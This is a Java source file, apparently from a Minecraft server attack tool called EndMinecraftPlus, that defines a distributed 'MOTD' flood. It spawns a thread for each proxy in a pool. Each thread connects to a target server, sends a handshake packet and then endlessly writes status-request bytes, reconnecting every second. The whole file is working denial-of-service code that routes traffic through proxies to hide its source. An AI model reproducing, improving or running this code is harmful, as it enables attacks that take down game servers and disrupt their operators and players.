package luohuayu.EndMinecraftPlus.tasks.attack;

import java.io.IOException;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Proxy;
import java.net.Socket;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;

import luohuayu.EndMinecraftPlus.Utils;
import luohuayu.EndMinecraftPlus.proxy.ProxyPool;

public class DistributedMotdAttack extends IAttack {
    public List<Thread> threads = new ArrayList<Thread>();

    public DistributedMotdAttack(String ip, int port, int time, int maxconnect, int joinsleep) {
        super(ip, port, time, maxconnect, joinsleep);
    }

    public void start() {
        for (String p : ProxyPool.proxys) {
            try {
                String[] _p = p.split(":");
                Proxy proxy = new Proxy(Proxy.Type.HTTP, new InetSocketAddress(_p[0], Integer.parseInt(_p[1])));
                Thread thread = createThread(proxy, ip, port);
                thread.start();
                threads.add(thread);
                if (this.attack_maxconnect > 0 && (threads.size() > this.attack_maxconnect))
                    return;
            } catch (Exception e) {
                Utils.log("Motd", e.getMessage());
            }
        }
    }

    @SuppressWarnings("deprecation")
    public void stop() {
        threads.forEach(thread -> {
            thread.stop();
        });
    }

    public Thread createThread(Proxy proxy, String ip, int port) {
        Runnable task = () -> {
            while (true) {
                try {
                    Socket socket = new Socket(proxy);
                    socket.connect(new InetSocketAddress(ip, port));
                    if (socket.isConnected()) {
                        Utils.log("Motd/" + Thread.currentThread().getName(), "连接成功");
                        OutputStream out = socket.getOutputStream();
                        out.write(new byte[]{0x07, 0x00, 0x05, 0x01, 0x30, 0x63, (byte) 0xDD, 0x01});
                        out.flush();
                        while (socket.isConnected()) {
                            for (int i = 0; i < 10; i++) {
                                out.write(new byte[]{0x01, 0x00, 0x01, 0x00, 0x01, 0x00, 0x01, 0x00, 0x01, 0x00, 0x01,
                                        0x00, 0x01, 0x00, 0x01, 0x00, 0x01, 0x00, 0x01, 0x00});
                            }
                            out.flush();
                        }
                        try {
                            out.close();
                            socket.close();
                        } catch (IOException e) {
                        }
                        Utils.log("Motd/" + Thread.currentThread().getName(), "已断开");
                    }
                } catch (Throwable e) {
                    Utils.log("Motd/" + Thread.currentThread().getName(), e.getMessage());
                }
                Utils.sleep(1000);
            }
        };
        return new Thread(task);
    }
}
